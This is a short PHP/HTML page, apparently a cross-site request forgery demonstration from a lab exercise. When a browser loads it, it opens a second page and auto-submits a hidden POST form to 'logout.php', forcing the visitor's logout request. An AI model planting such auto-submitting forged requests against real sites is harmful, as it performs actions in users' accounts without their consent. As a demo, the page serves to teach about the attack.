<?php

?>

<!DOCTYPE html>
<html>
    <body>
        <script>
            document.onload(window.open("csrf2.php"))
        </script>
        
        <form
            action="logout.php"
            method="POST"
            id="csrf_form">
            <input type="hidden" name="logout" value="1"/>
        </form>

        <script>
            document.getElementById('csrf_form').submit()
        </script>
    </body>
</html>